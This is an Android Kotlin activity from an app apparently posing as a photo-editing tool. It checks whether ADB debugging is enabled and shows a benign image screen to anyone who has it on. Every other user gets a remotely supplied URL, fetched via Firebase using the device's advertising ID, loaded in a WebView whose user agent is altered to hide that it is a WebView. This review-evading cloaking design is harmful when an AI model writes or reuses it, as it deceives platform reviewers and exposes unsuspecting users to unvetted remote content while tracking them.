package vn.remove.photo.conten

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.preference.PreferenceManager
import android.provider.Settings
import android.view.View
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import vn.remove.photo.conten.databinding.ActivityBoatWebBinding
import vn.remove.photo.logics.BoatModelFirebase.Companion.GET_FALSE
import vn.remove.photo.logics.BoatModelFirebase.Companion.GET_ONE
import vn.remove.photo.logics.BoatModelFirebase.Companion.GET_TWO
import vn.remove.photo.logics.BoatModelFirebase.Companion.INDIA_LINK_EMPTY
import vn.remove.photo.logics.BoatModelFirebase.Companion.MESSAGE
import vn.remove.photo.logics.BoatModelFirebase.Companion.SAVE_SH

class BoatWebActivity : AppCompatActivity() {
    private val boatView by lazy {
        ViewModelProvider(this)[BoatViewModel::class.java]
    }
    private val main by lazy {
        ActivityBoatWebBinding.inflate(layoutInflater)
    }
    lateinit var end: SharedPreferences
    var array: ValueCallback<Array<Uri?>>? = null
    private val any = 1

    private val clickIm = "Image Chooser"
    private var oneLink: String? = null
    private val stringImage = "image/*"
    var uriBack: ValueCallback<Uri>? = null

    lateinit var endEdit: SharedPreferences.Editor

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(main.root)

        val pop = PreferenceManager.getDefaultSharedPreferences(this)

        mainWork(savedInstanceState, pop)
    }

    private fun mainWork(
        savedInstanceState: Bundle?,
        prefs: SharedPreferences
    ) {
        joinData().observe(this) {
            boatView.firedataLive(application, it).observe(this) { live ->
                if (modADB(application)) {
                    try {
                        startActivity(Intent(this, ImageActivity::class.java))
                        finish()
                    } catch (e: Exception) {
                        Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show()
                    }

                } else {
                    try {
                        oneLink = live
                        oneFun(savedInstanceState, it)
                    }catch (e: Exception) {
                        Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show()
                    }

                }
            }
            setLinkOne(prefs, it)
        }
    }

    private fun setLinkOne(prefs: SharedPreferences, it: String) {
        if (!prefs.getBoolean("end", false)) {
            boatView.buildingLinkGetter(this, it)
            val editor = prefs.edit()
            editor.putBoolean("end", true)
            editor.apply()
        }
    }

    private fun oneFun(savedInstanceState: Bundle?, id: String) {
        try {
            CookieManager.getInstance().setAcceptCookie(true)
            CookieManager.getInstance().setAcceptThirdPartyCookies(main.webWork, true)
            end = getSharedPreferences(SAVE_SH, Context.MODE_PRIVATE)
            endEdit = end.edit()
            webViewSetin()

            main.webWork.webViewClient = BoatLocal(id)
            main.webWork.settings.javaScriptEnabled = true

            twoFun(savedInstanceState)
        }catch (e:Exception){
            Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show()
        }

    }

    private fun webViewSetin() {
        try {
            main.webWork.loadUrl(oneLink.toString())
            main.webWork.settings.domStorageEnabled = true
            main.webWork.settings.userAgentString = WebView(application)
                .settings.userAgentString
                .replace("wv", "")
            main.webWork.settings.loadWithOverviewMode = false
        }catch (e:Exception){
            Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show()
        }
    }

    private fun twoFun(savedInstanceState: Bundle?) {
        main.webWork.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
            }

            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri?>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                array = filePathCallback
                val content = Intent(Intent.ACTION_GET_CONTENT)
                content.addCategory(Intent.CATEGORY_OPENABLE)
                content.type = stringImage
                startActivityForResult(
                    Intent.createChooser(content, clickIm),
                    any
                )
                return true
            }

            override fun onCreateWindow(
                view: WebView?, isDialog: Boolean,
                isUserGesture: Boolean, resultMsg: Message
            ): Boolean {
                val newWebView = WebView(applicationContext)
                with(newWebView.settings) {
                    javaScriptEnabled = true
                    javaScriptCanOpenWindowsAutomatically = true
                    domStorageEnabled = true
                    setSupportMultipleWindows(true)
                }
                newWebView.webChromeClient = this

                val transport = resultMsg.obj as WebView.WebViewTransport
                transport.webView = newWebView
                resultMsg.sendToTarget()

                newWebView.webViewClient = object : WebViewClient() {
                    override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                        if (savedInstanceState == null) {
                            coupDevice(url)
                        }
                        return true
                    }
                }
                return true
            }

            private fun coupDevice(url: String) {
                if (savedInstanceState == null) {
                    main.webWork.loadUrl(url)
                }
            }
        }
    }
    private inner class BoatLocal(
        val gog: String
    ) : WebViewClient() {

        override fun onReceivedError(
            view: WebView?,
            errorCode: Int,
            description: String?,
            failingUrl: String?
        ) {
            super.onReceivedError(view, errorCode, description, failingUrl)
            errorMessage(errorCode)
        }

        private fun errorMessage(errorCode: Int) {
            if (errorCode == -2) {
                Toast.makeText(application, MESSAGE, Toast.LENGTH_LONG).show()
            }
        }

        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            return super.shouldOverrideUrlLoading(view, request)
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            if (url.equals(INDIA_LINK_EMPTY)) {
                boatView.setBoat(
                    linkUrl = url.toString(),
                    gog = gog,
                    app = application
                )
                startActivity(Intent(this@BoatWebActivity, ImageActivity::class.java))
                finish()
            } else {
                funVisibl()
                CookieManager.getInstance().flush()
                whenSaveLink(url)
            }
        }

        private fun whenSaveLink(url: String?) {
            when (end.getString(GET_ONE, "")) {
                GET_TWO -> {
                    boatView.setBoat(
                        linkUrl = url.toString(),
                        gog = gog,
                        app = application
                    )
                    endEdit.putString(GET_ONE, GET_FALSE)
                    endEdit.commit()
                }
                "" -> {
                    boatView.setBoat(
                        linkUrl = url.toString(),
                        gog = gog,
                        app = application
                    )
                    endEdit.putString(GET_ONE, GET_FALSE)
                    endEdit.commit()
                    endEdit.putString(GET_ONE, GET_TWO)
                    endEdit.commit()
                }
                GET_FALSE -> {
                    endEdit.putString(GET_ONE, GET_FALSE)
                    endEdit.commit()
                }

                null -> {
                    endEdit.putString(GET_ONE, GET_TWO)
                    endEdit.commit()
                }
            }
        }

        private fun funVisibl() {
            main.rawView.visibility = View.GONE
            main.webWork.visibility = View.VISIBLE
        }
    }

    override fun onActivityResult(
        requestCode: Int,
        resultCode: Int,
        data: Intent?
    ) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == this.any) {
            bobResTot(data, resultCode, requestCode)
        }
    }

    private fun bobResTot(
        data: Intent?,
        resultCode: Int,
        requestCode: Int
    ) {
        if (null == uriBack && null == array) return
        val result =
            if (data == null || resultCode != RESULT_OK) null else data.data
        if (array != null) {
            resOpBoat(requestCode, resultCode, data, array)
        } else if (uriBack != null) {
            helpResult(result)
        }
    }

    private fun helpResult(result: Uri?) {
        uriBack!!.onReceiveValue(result)
        uriBack = null
    }

    private fun resOpBoat(
        requestCode: Int,
        resultCode: Int,
        intent: Intent?,
        messageAb: ValueCallback<Array<Uri?>>?
    ) {
        if (requestCode != this.any || messageAb == null) return
        var results: Array<Uri?>? = null
        if (resultCode == Activity.RESULT_OK) {
            if (intent != null) {
                results = getterInit(intent, results)
            }
        }
        messageAb.onReceiveValue(results)
    }

    private fun getterInit(
        intent: Intent,
        results: Array<Uri?>?
    ): Array<Uri?>? {
        var results1 = results
        val dataString = intent.dataString
        val clipData = intent.clipData
        if (clipData != null) {
            results1 = arrayOfNulls(clipData.itemCount)
            for (i in 0 until clipData.itemCount) {
                val item = clipData.getItemAt(i)
                results1[i] = item.uri
            }
        }
        if (dataString != null) results1 =
            arrayOf(Uri.parse(dataString))
        return results1
    }

    override fun onBackPressed() {
        if (main.webWork.canGoBack()) {
            main.webWork.goBack()
        }
    }


    private fun joinData(): LiveData<String> {
        val i: MutableLiveData<String> = MutableLiveData()
        lifecycleScope.launch {
            i.value = withContext(Dispatchers.Default) {
                AdvertisingIdClient.getAdvertisingIdInfo(
                    application
                ).id.toString()
            }
        }
        return i
    }


    private fun modADB(context: Context): Boolean {
        return Settings.Global.getString(
            context.contentResolver,
            Settings.Global.ADB_ENABLED
        ) == "1"
    }
}